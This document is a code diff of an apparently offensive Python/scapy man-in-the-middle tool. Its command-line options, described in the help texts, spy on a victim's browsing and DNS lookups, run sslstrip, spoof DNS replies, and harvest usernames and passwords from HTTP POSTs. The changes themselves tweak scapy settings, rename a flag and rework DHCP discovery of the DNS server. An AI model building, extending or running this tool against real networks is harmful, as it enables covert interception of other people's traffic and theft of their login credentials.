@@ -5,7 +5,7 @@ logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
 from scapy.all import *
 conf.verb=0
 #Below is necessary to receive a response to the DHCP packets for some reason. If you know the answer to that message me.
-conf.checkIPaddr=1
+conf.checkIPaddr=0
 import time
 import sys
 import threading
@@ -27,7 +27,7 @@ parser.add_argument("-u", "--urlspy", help="Show all URLs the victim is browsing
 parser.add_argument("-d", "--dnsspy", help="Show all DNS resquests the victim makes. This has the advantage of showing HTTPS domains which the -u option will not but does not show the full URL the victim is requesting.", action="store_true")
 parser.add_argument("-ip", "--ipaddress", help="Enter IP address of victim and skip the arp ping at the beginning.")
 parser.add_argument("-i", "--driftnet", help="Open an xterm window with driftnet.", action="store_true")
-parser.add_argument("-ssl", "--sslstrip", help="Open an xterm window with sslstrip and output to sslstrip.txt", action="store_true")
+parser.add_argument("-s", "--sslstrip", help="Open an xterm window with sslstrip and output to sslstrip.txt", action="store_true")
 parser.add_argument("-uv", "--verboseURL", help="Shows all URLs the victim visits including possible searches.", action="store_true")
 parser.add_argument("-dns", "--dnsspoof", help="Spoof DNS responses of a specific domain. Enter domain after this argument")
 parser.add_argument("-p", "--post", help="Print the URL the victim POSTs to, show usernames and passwords in unsecure HTTP POSTs", action="store_true")
@@ -58,13 +58,15 @@ interface = routerRE.group(3)
 localIP = [x[4] for x in scapy.all.conf.route.routes if x[2] != '0.0.0.0'][0]
 
 print "Checking the DNS server..."
-dhcp_discover = Ether(dst="ff:ff:ff:ff:ff:ff")/IP(src="0.0.0.0",dst="255.255.255.255")/UDP(sport=68,dport=67)/BOOTP(chaddr=RandString(12,'0123456789abcdef'))/DHCP(options=[("message-type","discover"),"end"])
-ans, unans = srp(dhcp_discover, timeout=7, retry=2)
-if ans:
-	for p in ans:
-		DNSserver = p[1][IP].src
-		print "DNS server at:", DNSserver, '\n'
-else:
+#dhcp_discover = Ether(dst="ff:ff:ff:ff:ff:ff")/IP(src="0.0.0.0",dst="255.255.255.255")/UDP(sport=68,dport=67)/BOOTP(chaddr=RandString(12,'0123456789abcdef'))/DHCP(options=[("message-type","discover"),"end"])
+#ans, unans = srp(dhcp_discover, timeout=7, retry=2)
+#if ans:
+#	for p in ans:
+try:
+	DNSserver = dhcp_request()
+	DNSserver = DNSserver[IP].src
+	print "DNS server at:", DNSserver, '\n'
+except:
 	print "No answer to DHCP packet sent to find the DNS server. Setting DNS server to router IP.\n"
 	DNSserver = routerIP
 
